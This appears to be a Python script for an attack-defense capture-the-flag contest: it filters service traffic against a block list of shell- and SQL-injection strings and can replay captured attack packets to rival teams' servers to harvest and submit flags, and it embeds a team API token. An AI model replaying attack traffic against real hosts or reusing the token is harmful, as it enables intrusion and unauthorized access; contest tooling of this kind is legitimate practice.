#!/usr/bin/python2

# sudo apt-get install python-nfqueue

import nfqueue
import swpag_client
from scapy.all import *
import os
import re
import socket
import time
from threading import Thread
from random import *

#thread num limit
PARALLEL_LIMIT = 4
ATTACK_OTHER_TEAM_SWITCH = False


#the packet who has below strings is malicious
STRING_FILTER_LIST = [';cat', ';ls', '; cat', 'grep', 'cat ', 'description%20like','description%20AS%20data','select%20description','union%20select','1 aaaaaaaaaa', '/bin/','head --bytes','\x90\x90\x90']

# to be changed in new environment
TEAM_INTERFACE = "http://52.37.204.0"
OUR_TEAM_TOKEN = "ZOGR9UqlRWFg8wLJB3aj"
OUR_TEAM_IP = '10.9.19.3'

sc= swpag_client.Team(TEAM_INTERFACE, OUR_TEAM_TOKEN)
all_service_list = sc.get_service_list()

for service in all_service_list:
    team_list = sc.get_targets(service['service_id'])
    print(team_list) 
    for team in team_list:
        team['ip'] = socket.gethostbyname(team['hostname'])
    service['team_list'] = team_list

#add rules to handle the traffic to service port
for service in all_service_list:
    print('set rules for port' + str(service['port']) +'\n')
    os.system("iptables -t raw -I PREROUTING -p tcp --destination-port "+ str(service['port']) +" -j NFQUEUE --queue-num 2")
    os.system("iptables -A OUTPUT -p tcp --tcp-flags RST RST --dport "+ str(service['port']) +"  -j DROP")

#TCP connection pool, store the TCP connection infomation to each target team
_conn_pool = {}
#if response from target include a flag, it means we shall drop the current received packet
_detected_flag = False
_parrel_no = 0

#get service by port, then get teams running this service
def get_teams_by_port(port):
    services=[s for s in all_service_list if s['port']==port]    
    if len(services)>0:
        team_list = services[0]['team_list']
        return team_list
    else:
        return []

#recalculate the chksum of packet
def recal_chksum(pkt2):
    del pkt2[TCP].chksum
    pkt2[TCP]=pkt2[TCP].__class__(bytes(pkt2[TCP]))        
    del pkt2.chksum
    pkt2 = pkt2.__class__(bytes(pkt2))

#duplicate the packet and send to the target team, check if the target response packet has the flag id
#submit the flag_id and not response the original request if the target response packet has the flag id
def duplicate(pkt, target_team_ip):
    global _conn_pool
    global _detected_flag
    global _parrel_no
    #our_team_flag_id = 'to be retreived from swapg client'    
    #target_team_flag_id = 'to be retreived from swapg client'
    conn_key = OUR_TEAM_IP + ":" + str(pkt.sport) + "-" + target_team_ip + ":" + str(pkt.dport)
    if pkt.dst != OUR_TEAM_IP:
        print('forward traffic')
        return
    if pkt.ack > 0 and conn_key not in _conn_pool:
        return
    
    pkt2 = pkt.copy()
    pkt2.src = OUR_TEAM_IP
    pkt2.dst = target_team_ip
    
    _parrel_no = _parrel_no + 1
    if _parrel_no > PARALLEL_LIMIT:
        return
    print(_conn_pool)
    #SYN packet, just send it to target
    if pkt2.ack == 0:        
        _conn_pool[conn_key] = {}
        conn = _conn_pool[conn_key]
        conn['init_seq'] = pkt2.seq
        conn['target_ack'] = 0
        conn['packet_count'] = 1
                
        recal_chksum(pkt2)        
        print('send SYN to target')
        print('***SYN PKT2 *****************************************************')
        pkt2.show()
        response = sr1(pkt2, timeout=0.02)        
        if response is None:#establish tcp connection failed
            conn={}
            print("establish tcp connection to target failed")
        else: #establish tcp connection succ
            print('***SYNACK RESPONSE*****************************************************')
            response.show()
            conn['target_ack'] = response.seq
            print("establish tcp connection to target succ")
            print("conn['target_ack'] = "+ str(conn['target_ack']) )
    #we need calculate the ack diff of original packet and our fake packet to target    
    else:
        conn = _conn_pool[conn_key]
        if 'ack_diff' not in conn:
            conn['ack_diff'] = conn['target_ack'] - pkt2.ack + 1
            print('caculate ack_diff=[ pkt2.ack:'+str(pkt2.ack)+' - target_ack:'+str(conn['target_ack'])+' = '+str(conn['ack_diff'])+']')
        
        conn['packet_count'] = conn['packet_count'] + 1
        pkt2.ack = pkt2.ack + conn['ack_diff']
        
        #pkt2[TCP].payload = str(pkt2[TCP].payload).replace(our_team_flag_id,target_team_flag_id)
        
        recal_chksum(pkt2)
        print('***PKT2 *****************************************************')
        pkt2.show()
        print('send to target')
        response = sr1(pkt2, timeout=0.02)
        
        if response is None:
            print("target no response")
        else: 
            print("target response succ")
            print('***TARGET RESPONSE*****************************************************')
            response.show()
            # search flag pattern in the response packet
            FLAG_REGEX = (r'FLG[0-9A-Za-z]{13}')
            match = re.search(FLAG_REGEX, str(response[TCP].payload))
            if match:
                _detected_flag = True
                result = sc.submit_flag([match.group(0)])
                print(result)
            
#all traffic received on service port will be handle here
def callback(payload):
    data = payload.get_data()
    pkt = IP(data)
    
    if not pkt.haslayer('TCP'):
        payload.set_verdict(nfqueue.NF_ACCEPT)
        return
    
    print("Got a tcp packet !\n source ip : " + str(pkt.src) + " src port:" + str(pkt.sport) +"\ndst ip:"+str(pkt.dst) + " dst port:" + str(pkt.dport) + "\npayload:" +str(pkt[TCP].payload) +"\n")
    print('***RECEIVE PKT *****************************************************')
    pkt.show()
    print("\n\n")
    
    
    
    global _detected_flag
    _detected_flag = False
    
    #string filter
    if pkt[TCP].haslayer('Raw'):
        for bad_str in STRING_FILTER_LIST:
            if str(pkt[TCP].payload).find(bad_str) > 0:
                _detected_flag = True
                
    #saywhat filter
    FLAG_REGEX = (r'[0-9A-Za-z]{20}.json')
    match = re.search(FLAG_REGEX, str(pkt[TCP].payload))
    if match:
        _detected_flag = True
    
    #below for atack other team using received packet
    if ATTACK_OTHER_TEAM_SWITCH:
        threads = []
        target_team_list = get_teams_by_port(pkt.dport)
        print('***target team list *****************************************************')
        #send to all teams running the service and see their response
        for team in target_team_list:
            #random select 5 teams to attack every time
            if randrange(26) > 6:
                break
            team_ip = team['ip']
            t = Thread(target=duplicate, args=(pkt, team_ip))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
        
    if _detected_flag:
        payload.set_verdict(nfqueue.NF_DROP)
        print('bad packet found')
    else:
        payload.set_verdict(nfqueue.NF_ACCEPT)
        print('flag not found')


def main():
    q = nfqueue.queue()
    q.open()
    q.bind(socket.AF_INET)
    q.set_callback(callback)
    q.create_queue(2)
    try:
        q.try_run() # Main loop
    except KeyboardInterrupt:
        q.unbind(socket.AF_INET)
        q.close()
        print("restore iptables.")
        for service in all_service_list:
            os.system("iptables -t raw -D PREROUTING -p tcp --destination-port "+ str(service['port']) +" -j NFQUEUE --queue-num 2")
            os.system("iptables -D OUTPUT -p tcp --tcp-flags RST RST --dport "+ str(service['port']) +"  -j DROP")

if __name__ == "__main__":
    main()
    main()